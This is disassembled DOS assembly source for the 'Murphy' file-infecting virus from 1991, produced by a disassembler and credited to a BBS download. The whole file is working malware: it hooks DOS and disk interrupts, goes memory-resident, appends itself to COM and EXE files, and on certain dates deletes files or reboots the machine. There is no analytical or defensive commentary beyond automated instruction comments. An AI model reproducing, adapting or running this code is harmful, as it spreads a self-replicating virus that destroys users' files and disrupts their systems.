

  
PAGE  59,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        MURPHY				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   4-Mar-91					         ÛÛ
;ÛÛ      Version:						         ÛÛ
;ÛÛ      Passes:    5	       Analysis Options on: H		         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
data_1e		equ	4Ch			; (0000:004C=74h)
data_3e		equ	84h			; (0000:0084=0EBh)
data_5e		equ	90h			; (0000:0090=56h)
data_7e		equ	102h			; (0000:0102=0F000h)
data_8e		equ	106h			; (0000:0106=0F000h)
data_9e		equ	47Bh			; (0000:047B=14h)
data_10e	equ	0			; (4098:0000=0FFh)
data_11e	equ	1			; (4099:0001=0FFFFh)
data_12e	equ	2			; (40EB:0002=0FFFFh)
data_13e	equ	6			; (40EB:0006=0FFFFh)
data_31e	equ	0FC99h			; (7415:FC99=0)
data_32e	equ	0FC9Bh			; (7415:FC9B=0)
data_33e	equ	0FCB7h			; (7415:FCB7=0)
data_34e	equ	0FCB9h			; (7415:FCB9=0)
data_35e	equ	0FCBBh			; (7415:FCBB=0)
data_36e	equ	0FCC5h			; (7415:FCC5=0)
data_37e	equ	0FCC7h			; (7415:FCC7=0)
data_38e	equ	0FCCDh			; (7415:FCCD=0)
data_39e	equ	0FCCFh			; (7415:FCCF=0)
data_40e	equ	0			; (F000:0000=0AA55h)
data_41e	equ	2			; (F000:0002=40h)
  
seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a
  
  
		org	100h
  
murphy		proc	far
  
start:
		jmp	loc_28			; (0466)
		db	0C3h
		db	23 dup (0C3h)
		db	2Ah, 2Eh, 45h, 58h, 45h, 0
data_17		dw	0C3C3h
data_18		dw	0C3C3h
data_19		db	0, 0
data_20		dw	0
data_21		dw	0
data_22		dw	0
data_23		dw	7415h
data_24		dd	00000h
data_25		dw	0
data_26		dw	7415h
data_27		dd	00000h
data_28		dw	0
data_29		dw	7415h
		db	0Ah, 0Dh, 0Ah, 0Dh, ' Bhaktivedan'
		db	'ta Swami Prabhupada (1896-1977)', 0Ah
		db	0Dh, 0Ah, 0Dh, '$'
		db	'=MKu', 9, 'U'
		db	8Bh, 0ECh, 83h, 66h, 6, 0FEh
		db	5Dh, 0CFh, 80h, 0FCh, 4Bh, 74h
		db	12h, 3Dh, 0, 3Dh, 74h, 0Dh
		db	3Dh, 0, 6Ch, 75h, 5, 80h
		db	0FBh, 0, 74h, 3, 0E9h, 0BEh
		db	0, 6, 1Eh, 57h, 56h, 55h
		db	52h, 51h, 53h, 50h, 0E8h, 48h
		db	2, 0E8h, 82h, 2, 3Dh, 0
		db	6Ch, 75h, 2, 8Bh, 0D6h
loc_1:
		mov	cx,80h
		mov	si,dx
  
locloop_2:
		inc	si
		mov	al,[si]
		or	al,al			; Zero ?
		loopnz	locloop_2		; Loop if zf=0, cx>0
  
		sub	si,2
		cmp	word ptr [si],4D4Fh
		je	loc_5			; Jump if equal
		cmp	word ptr [si],4558h
		je	loc_4			; Jump if equal
loc_3:
		jmp	short loc_12		; (024A)
		db	90h
loc_4:
		cmp	word ptr [si-4],4E41h
		je	loc_6			; Jump if equal
		cmp	word ptr [si-4],444Ch
		je	loc_6			; Jump if equal
		cmp	word ptr [si-4],4A52h
		je	loc_6			; Jump if equal
		jnz	loc_7			; Jump if not zero
loc_5:
		cmp	word ptr [si-4],444Eh
		je	loc_3			; Jump if equal
		jnz	loc_8			; Jump if not zero
loc_6:
		int	19h			; Bootstrap loader
loc_7:
		jz	loc_8			; Jump if zero
loc_8:
		mov	ax,3D02h
		call	sub_5			; (03E5)
		jc	loc_12			; Jump if carry Set
		mov	bx,ax
		mov	ax,5700h
		call	sub_5			; (03E5)
		mov	cs:data_20,cx		; (7415:0127=0)
		mov	cs:data_21,dx		; (7415:0129=0)
		mov	ax,4200h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_5			; (03E5)
		push	cs
		pop	ds
		mov	dx,103h
		mov	si,dx
		mov	cx,18h
		mov	ah,3Fh			; '?'
		call	sub_5			; (03E5)
		jc	loc_10			; Jump if carry Set
		cmp	word ptr [si],5A4Dh
		jne	loc_9			; Jump if not equal
		call	sub_1			; (025B)
		jmp	short loc_10		; (0233)
loc_9:
		call	sub_4			; (036B)
loc_10:
		jc	loc_11			; Jump if carry Set
		mov	ax,5701h
		mov	cx,cs:data_20		; (7415:0127=0)
		mov	dx,cs:data_21		; (7415:0129=0)
		call	sub_5			; (03E5)
loc_11:
		mov	ah,3Eh			; '>'
		call	sub_5			; (03E5)
loc_12:
		call	sub_7			; (0429)
		pop	ax
		pop	bx
		pop	cx
		pop	dx
		pop	bp
		pop	si
		pop	di
		pop	ds
		pop	es
loc_13:
		jmp	cs:data_24		; (7415:012F=0)
  
murphy		endp
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_1		proc	near
		mov	ah,2Ah			; '*'
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dx=mon/day
		cmp	dh,4
		je	loc_14			; Jump if equal
		jnz	loc_15			; Jump if not zero
loc_14:
		mov	ah,2Ah			; '*'
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dx=mon/day
		cmp	dl,0Fh
		je	loc_16			; Jump if equal
		jnz	loc_15			; Jump if not zero
loc_15:
		mov	cx,[si+16h]
		add	cx,[si+8]
		mov	ax,10h
		mul	cx			; dx:ax = reg * ax
		add	ax,[si+14h]
		adc	dx,0
		push	dx
		push	ax
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_5			; (03E5)
		cmp	dx,0
		jne	loc_17			; Jump if not equal
		cmp	ax,4E2h
		jae	loc_17			; Jump if above or =
		pop	ax
		pop	dx
		stc				; Set carry flag
		retn
loc_16:
		mov	dx,10h
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		mov	dx,11Bh
		mov	cx,110Bh
		mov	ah,4Eh			; 'N'
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		mov	dx,2Eh
		mov	ax,3D02h
		int	15h			; General services, ah=func 3Dh
		mov	ah,41h			; 'A'
		int	21h			; DOS Services  ah=function 41h
						;  delete file, name @ ds:dx
		jmp	loc_23			; (0395)
		db	0BAh, 3Fh, 1, 0B4h, 9, 0CDh
		db	21h, 0EBh, 1, 90h
loc_17:
		mov	di,ax
		mov	bp,dx
		pop	cx
		sub	ax,cx
		pop	cx
		sbb	dx,cx
		cmp	word ptr [si+0Ch],0
		je	loc_ret_20		; Jump if equal
		cmp	dx,0
		jne	loc_18			; Jump if not equal
		cmp	ax,4E2h
		jne	loc_18			; Jump if not equal
		stc				; Set carry flag
		retn
loc_18:
		mov	dx,bp
		mov	ax,di
		push	dx
		push	ax
		add	ax,4E2h
		adc	dx,0
		mov	cx,200h
		div	cx			; ax,dx rem=dx:ax/reg
		les	di,dword ptr [si+2]	; Load 32 bit ptr
		mov	cs:data_22,di		; (7415:012B=0)
		mov	cs:data_23,es		; (7415:012D=7415h)
		mov	[si+2],dx
		cmp	dx,0
		je	loc_19			; Jump if equal
		inc	ax
loc_19:
		mov	[si+4],ax
		pop	ax
		pop	dx
		call	sub_2			; (034C)
		sub	ax,[si+8]
		les	di,dword ptr [si+14h]	; Load 32 bit ptr
		mov	data_17,di		; (7415:0121=0C3C3h)
		mov	data_18,es		; (7415:0123=0C3C3h)
		mov	[si+14h],dx
		mov	[si+16h],ax
		mov	word ptr data_19,ax	; (7415:0125=0)
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_5			; (03E5)
		call	sub_3			; (035D)
		jc	loc_ret_20		; Jump if carry Set
		mov	ax,4200h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_5			; (03E5)
		mov	ah,40h			; '@'
		mov	dx,si
		mov	cx,18h
		call	sub_5			; (03E5)
  
loc_ret_20:
		retn
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
sub_2:
		mov	cx,4
		mov	di,ax
		and	di,0Fh
  
locloop_21:
		shr	dx,1			; Shift w/zeros fill
		rcr	ax,1			; Rotate thru carry
		loop	locloop_21		; Loop if cx > 0
  
		mov	dx,di
		retn
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
sub_3:
		mov	ah,40h			; '@'
		mov	cx,4E2h
		mov	dx,100h
		call	sub_6			; (03EC)
		jmp	short loc_27		; (03E5)
		db	90h
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
sub_4:
		mov	ah,2Ah			; '*'
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dx=mon/day
		cmp	al,6
		je	loc_22			; Jump if equal
		jnz	loc_23			; Jump if not zero
loc_22:
		mov	dx,10h
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		mov	dx,11Bh
		mov	cx,110Bh
		mov	ah,4Eh			; 'N'
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		mov	dx,2Eh
		mov	ax,3D02h
		int	15h			; General services, ah=func 3Dh
		mov	ah,41h			; 'A'
		int	21h			; DOS Services  ah=function 41h
						;  delete file, name @ ds:dx
		jmp	short loc_23		; (0395)
		db	90h
loc_23:
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_5			; (03E5)
		cmp	ax,4E2h
		jb	loc_ret_26		; Jump if below
		cmp	ax,0FA00h
		jae	loc_ret_26		; Jump if above or =
		push	ax
		cmp	byte ptr [si],0E9h
		jne	loc_24			; Jump if not equal
		sub	ax,4E5h
		cmp	ax,[si+1]
		jne	loc_24			; Jump if not equal
		pop	ax
		stc				; Set carry flag
		retn
loc_24:
		call	sub_3			; (035D)
		jnc	loc_25			; Jump if carry=0
		pop	ax
		retn
loc_25:
		mov	ax,4200h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_5			; (03E5)
		pop	ax
		sub	ax,3
		mov	dx,121h
		mov	si,dx
		mov	byte ptr cs:[si],0E9h
		mov	cs:[si+1],ax
		mov	ah,40h			; '@'
		mov	cx,3
		call	sub_5			; (03E5)
  
loc_ret_26:
		retn
sub_1		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_5		proc	near
loc_27:
		pushf				; Push flags
		call	cs:data_24		; (7415:012F=0)
		retn
sub_5		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_6		proc	near
		push	ax
		push	ds
		push	es
		xor	ax,ax			; Zero register
		push	ax
		pop	ds
		cli				; Disable interrupts
		les	ax,dword ptr ds:data_5e	; (0000:0090=156h) Load 32 bit ptr
		mov	cs:data_25,ax		; (7415:0133=0)
		mov	cs:data_26,es		; (7415:0135=7415h)
		mov	ax,44Eh
		mov	ds:data_5e,ax		; (0000:0090=156h)
		mov	word ptr ds:data_5e+2,cs	; (0000:0092=124Ch)
		les	ax,dword ptr ds:data_1e	; (0000:004C=774h) Load 32 bit ptr
		mov	cs:data_28,ax		; (7415:013B=0)
		mov	cs:data_29,es		; (7415:013D=7415h)
		les	ax,cs:data_27		; (7415:0137=0) Load 32 bit ptr
		mov	ds:data_1e,ax		; (0000:004C=774h)
		mov	word ptr ds:data_1e+2,es	; (0000:004E=70h)
		sti				; Enable interrupts
		pop	es
		pop	ds
		pop	ax
		retn
sub_6		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_7		proc	near
		push	ax
		push	ds
		push	es
		xor	ax,ax			; Zero register
		push	ax
		pop	ds
		cli				; Disable interrupts
		les	ax,dword ptr cs:data_25	; (7415:0133=0) Load 32 bit ptr
		mov	ds:data_5e,ax		; (0000:0090=156h)
		mov	word ptr ds:data_5e+2,es	; (0000:0092=124Ch)
		les	ax,dword ptr cs:data_28	; (7415:013B=0) Load 32 bit ptr
		mov	ds:data_1e,ax		; (0000:004C=774h)
		mov	word ptr ds:data_1e+2,es	; (0000:004E=70h)
		sti				; Enable interrupts
		pop	es
		pop	ds
		pop	ax
		retn
sub_7		endp
  
		db	0B0h, 3, 0CFh
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_8		proc	near
		mov	dx,10h
		mul	dx			; dx:ax = reg * ax
		retn
sub_8		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_9		proc	near
		xor	ax,ax			; Zero register
		xor	bx,bx			; Zero register
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		xor	si,si			; Zero register
		xor	di,di			; Zero register
		xor	bp,bp			; Zero register
		retn
sub_9		endp
  
loc_28:
		push	ds
		call	sub_10			; (046A)
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_10		proc	near
		mov	ax,4B4Dh
		nop
		int	21h			; DOS Services  ah=function 4Bh
						;  run progm @ds:dx, parm @es:bx
		jc	loc_29			; Jump if carry Set
		jmp	loc_39			; (059C)
loc_29:
		pop	si
		push	si
		nop
		mov	di,si
		xor	ax,ax			; Zero register
		push	ax
		pop	ds
		les	ax,dword ptr ds:data_1e	; (0000:004C=774h) Load 32 bit ptr
		mov	cs:data_38e[si],ax	; (7415:FCCD=0)
		mov	cs:data_39e[si],es	; (7415:FCCF=0)
		les	bx,dword ptr ds:data_3e	; (0000:0084=40EBh) Load 32 bit ptr
		mov	cs:data_36e[di],bx	; (7415:FCC5=0)
		mov	cs:data_37e[di],es	; (7415:FCC7=0)
		mov	ax,ds:data_7e		; (0000:0102=0F000h)
		cmp	ax,0F000h
		jne	loc_37			; Jump if not equal
		mov	dl,80h
		mov	ax,ds:data_8e		; (0000:0106=0F000h)
		cmp	ax,0F000h
		je	loc_30			; Jump if equal
		cmp	ah,0C8h
		jb	loc_37			; Jump if below
		cmp	ah,0F4h
		jae	loc_37			; Jump if above or =
		test	al,7Fh
		jnz	loc_37			; Jump if not zero
		mov	ds,ax
		cmp	word ptr ds:data_40e,0AA55h	; (F000:0000=0AA55h)
		jne	loc_37			; Jump if not equal
		mov	dl,ds:data_41e		; (F000:0002=40h)
loc_30:
		mov	ds,ax
		xor	dh,dh			; Zero register
		mov	cl,9
		shl	dx,cl			; Shift w/zeros fill
		mov	cx,dx
		xor	si,si			; Zero register
  
locloop_31:
		lodsw				; String [si] to ax
		cmp	ax,0FA80h
		jne	loc_32			; Jump if not equal
		lodsw				; String [si] to ax
		cmp	ax,7380h
		je	loc_33			; Jump if equal
		jnz	loc_34			; Jump if not zero
loc_32:
		cmp	ax,0C2F6h
		jne	loc_35			; Jump if not equal
		lodsw				; String [si] to ax
		cmp	ax,7580h
		jne	loc_34			; Jump if not equal
loc_33:
		inc	si
		lodsw				; String [si] to ax
		cmp	ax,40CDh
		je	loc_36			; Jump if equal
		sub	si,3
loc_34:
		dec	si
		dec	si
loc_35:
		dec	si
		loop	locloop_31		; Loop if cx > 0
  
		jmp	short loc_37		; (050B)
loc_36:
		sub	si,7
		mov	cs:data_38e[di],si	; (7415:FCCD=0)
		mov	cs:data_39e[di],ds	; (7415:FCCF=0)
loc_37:
		mov	ah,62h			; 'b'
		int	21h			; DOS Services  ah=function 62h
						;  get progrm seg prefix addr bx
		mov	es,bx
		mov	ah,49h			; 'I'
		int	21h			; DOS Services  ah=function 49h
						;  release memory block, es=seg
		mov	bx,0FFFFh
		mov	ah,48h			; 'H'
		int	21h			; DOS Services  ah=function 48h
						;  allocate memory, bx=bytes/16
		sub	bx,50h
		nop
		jc	loc_39			; Jump if carry Set
		mov	cx,es
		stc				; Set carry flag
		adc	cx,bx
		mov	ah,4Ah			; 'J'
		int	21h			; DOS Services  ah=function 4Ah
						;  change mem allocation, bx=siz
		mov	bx,4Fh
		stc				; Set carry flag
		sbb	es:data_12e,bx		; (40EB:0002=0FFFFh)
		push	es
		mov	es,cx
		mov	ah,4Ah			; 'J'
		int	21h			; DOS Services  ah=function 4Ah
						;  change mem allocation, bx=siz
		mov	ax,es
		dec	ax
		mov	ds,ax
		mov	word ptr ds:data_11e,8	; (4099:0001=0FFFFh)
		call	sub_8			; (0451)
		mov	bx,ax
		mov	cx,dx
		pop	ds
		mov	ax,ds
		call	sub_8			; (0451)
		add	ax,ds:data_13e		; (40EB:0006=0FFFFh)
		adc	dx,0
		sub	ax,bx
		sbb	dx,cx
		jc	loc_38			; Jump if carry Set
		sub	ds:data_13e,ax		; (40EB:0006=0FFFFh)
loc_38:
		mov	si,di
		xor	di,di			; Zero register
		push	cs
		pop	ds
		sub	si,36Ah
		mov	cx,4E2h
		inc	cx
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	ah,62h			; 'b'
		int	21h			; DOS Services  ah=function 62h
						;  get progrm seg prefix addr bx
		dec	bx
		mov	ds,bx
		mov	byte ptr ds:data_10e,5Ah	; (4098:0000=0FFh) 'Z'
		mov	dx,173h
		xor	ax,ax			; Zero register
		push	ax
		pop	ds
		mov	ax,es
		sub	ax,10h
		mov	es,ax
		cli				; Disable interrupts
		mov	ds:data_3e,dx		; (0000:0084=40EBh)
		mov	word ptr ds:data_3e+2,es	; (0000:0086=11h)
		sti				; Enable interrupts
		dec	byte ptr ds:data_9e	; (0000:047B=14h)
loc_39:
		pop	si
		cmp	word ptr cs:data_31e[si],5A4Dh	; (7415:FC99=0)
		jne	loc_40			; Jump if not equal
		pop	ds
		mov	ax,cs:data_35e[si]	; (7415:FCBB=0)
		mov	bx,cs:data_34e[si]	; (7415:FCB9=0)
		push	cs
		pop	cx
		sub	cx,ax
		add	cx,bx
		push	cx
		push	word ptr cs:data_33e[si]	; (7415:FCB7=0)
		push	ds
		pop	es
		call	sub_9			; (0457)
		retf				; Return far
loc_40:
		pop	ax
		mov	ax,cs:data_31e[si]	; (7415:FC99=0)
		mov	word ptr cs:[100h],ax	; (7415:0100=63E9h)
		mov	ax,cs:data_32e[si]	; (7415:FC9B=0)
		mov	word ptr cs:[102h],ax	; (7415:0102=0C303h)
		mov	ax,100h
		push	ax
		push	cs
		pop	ds
		push	ds
		pop	es
		call	sub_9			; (0457)
		retn
sub_10		endp
  
  
seg_a		ends
  
  
  
		end	start

Downloaded From P-80 International Information Systems 304-744-2253

